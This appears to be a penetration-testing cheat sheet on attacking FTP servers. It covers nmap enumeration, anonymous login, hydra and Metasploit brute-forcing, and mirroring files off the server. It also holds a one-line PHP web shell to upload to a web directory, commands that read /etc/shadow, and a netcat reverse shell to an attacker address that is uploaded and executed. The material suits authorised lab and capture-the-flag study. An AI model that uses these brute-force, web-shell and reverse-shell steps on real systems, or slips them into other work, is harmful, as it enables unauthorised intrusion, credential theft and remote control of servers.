```table-of-contents
```

!!! tip "Start here"
    Always try anonymous login first: `ftp <target>` then `anonymous:anonymous`. Check for write access — if you can write to a web-accessible directory, it's a file upload path.

## Enumeration
### Banner Grabbing
```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor $IP
```
## Authentication Attacks
### Anonymous Login Check
```bash
ftp anonymous@$IP
```

When prompted:
```pgsql
Name ($IP:root): anonymous
Password: anonymous
```

List files:
```shell
ftp> ls -la
```

### Brute-Forcing FTP
`Seclist` has a default list of passwords we can try before attempting to use `rockyou`:
```bash
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
```
* `-C` takes a file in format `user:password` and try all of the combinations

Metasploit:
```
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Enumerate FTP
```
ftp> status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off

ftp> debug

Debugging on (debug=1).

ftp> trace

Packet tracing on.
```

## Enumerate Hidden Files
Once logged into an FTP server, attempt the following:
```bash
ls -laR
```

or use `wget` to mirror the entire FTP directory:
```bash
wget -m --no-passive ftp://anonymous@$IP
```

## Data Exfiltration
```bash
ftp> get ftp_file
ftp> put ftp_file
```

For the exfiltration of binary files, enable binary mode:
```bash
ftp> type binary
```

## Exploiting Misconfigurations
### Uploading a Web Shell
If the FTP server is located in a web directory (`/var/www/html`), upload a PHP web shell.
```php
<?php system($_GET['cmd']); ?>
```

Upload:
```bash
ftp> put shell.php
```

Access via:
```
http://target.com/uploads/shell.php?cmd=id
```

## Post-Exploitation
### Enumerating FTP Configurations
Locate config files and user permissions and credentials:
```sh
cat /etc/vsftpd.conf
cat /etc/passwd | grep ftp
cat /etc/shadow
```

### Reverse Shell via FTP
If writable directories are available, create a reverse shell:
```bash
echo "nc -e /bin/bash <attacker-ip> <port>" > shell.sh
ftp> put shell.sh
ftp> chmod +x shell.sh
```

And execute remotely:
```bash
ftp> !nc -lvnp <port>
ftp> !./shell.sh
```